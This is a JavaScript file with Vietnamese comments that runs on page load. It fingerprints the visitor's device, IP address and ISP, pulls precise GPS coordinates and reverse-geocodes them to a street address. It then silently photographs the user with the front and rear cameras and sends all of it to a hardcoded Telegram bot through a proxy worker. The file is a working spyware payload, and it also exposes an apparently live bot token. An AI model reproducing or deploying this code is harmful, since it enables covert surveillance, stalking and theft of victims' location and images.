const TELEGRAM_BOT_TOKEN = '7678531626:AAFWnHCu0GbMggkf7hcjp_qZ_9wy2slFfS8';
const TELEGRAM_CHAT_ID = '6337854195';
const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: new Date().toLocaleString(),
  ip: '',
  isp: '',
  realIp: '',
  address: '',
  country: '',
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

// Nhận diện thiết bị
function detectDevice() {
  const ua = navigator.userAgent;
  if (/iPhone|iPad|iPod/i.test(ua)) {
    info.device = 'iOS Device';
    info.os = 'iOS';
  } else if (/Android/i.test(ua)) {
    const match = ua.match(/Android.*; (.+?) Build/);
    info.device = match ? match[1] : 'Android Device';
    info.os = 'Android';
  } else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else if (/Macintosh/i.test(ua)) {
    info.device = 'Mac';
    info.os = 'macOS';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

// Lấy IP dân cư
async function getPublicIP() {
  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
  info.ip = ip.ip || 'Không rõ';
}

// Lấy IP thật (gốc từ Cloudflare)
async function getRealIP() {
  const ip = await fetch('https://icanhazip.com').then(r => r.text());
  info.realIp = ip.trim();
  const data = await fetch(`https://ipwho.is/${info.realIp}`).then(r => r.json());
  info.isp = data.connection?.org || 'Không rõ';
}

// Lấy địa chỉ từ GPS nếu có, nếu không thì dùng địa chỉ IP gốc
function getLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return fallbackIPLocation().then(resolve);

    navigator.geolocation.getCurrentPosition(
      async pos => {
        info.lat = pos.coords.latitude.toFixed(6);
        info.lon = pos.coords.longitude.toFixed(6);
        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`, {
            headers: { 'User-Agent': 'Mozilla/5.0' }
          });
          const data = await res.json();
          info.address = data.display_name || '📍 Không rõ địa chỉ từ GPS';
          info.country = data.address?.country || 'Không rõ';
        } catch {
          info.address = '📍 GPS hoạt động nhưng không tìm được địa chỉ';
          info.country = 'Không rõ';
        }
        resolve();
      },
      async () => {
        await fallbackIPLocation();
        resolve();
      },
      { enableHighAccuracy: true, timeout: 7000 }
    );
  });
}

// Fallback IP location
async function fallbackIPLocation() {
  const data = await fetch(`https://ipwho.is/${info.realIp}`).then(r => r.json());
  info.lat = data.latitude?.toFixed(6) || '0';
  info.lon = data.longitude?.toFixed(6) || '0';
  info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
  info.country = data.country || 'Không rõ';
}

// Chụp ảnh từ camera
function captureCamera(facingMode = 'user') {
  return new Promise((resolve, reject) => {
    navigator.mediaDevices.getUserMedia({ video: { facingMode } })
      .then(stream => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        video.onloadedmetadata = () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');

          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
          }, 1000);
        };
      })
      .catch(reject);
  });
}

// Tạo caption gửi về
function getCaption() {
  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌍 IP dân cư: ${info.ip}
🧠 IP gốc: ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌎 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📸 Camera: ${info.camera}
`.trim();
}

// Gửi ảnh về Telegram
async function sendPhotos(frontBlob, backBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('media', JSON.stringify([
    { type: 'photo', media: 'attach://front', caption: getCaption() },
    { type: 'photo', media: 'attach://back' }
  ]));
  formData.append('front', frontBlob, 'front.jpg');
  formData.append('back', backBlob, 'back.jpg');

  return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
}

// Gửi text nếu không có ảnh
async function sendTextOnly() {
  return fetch(API_SEND_TEXT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: getCaption()
    })
  });
}

// Bắt đầu
async function main() {
  detectDevice();
  await getPublicIP();
  await getRealIP();
  await getLocation();

  let front = null, back = null;

  try {
    front = await captureCamera("user");
    back = await captureCamera("environment");
    info.camera = '✅ Đã chụp camera trước và sau';
  } catch {
    info.camera = '🚫 Không thể truy cập camera';
  }

  if (front && back) {
    await sendPhotos(front, back);
  } else {
    await sendTextOnly();
  }
}

main();
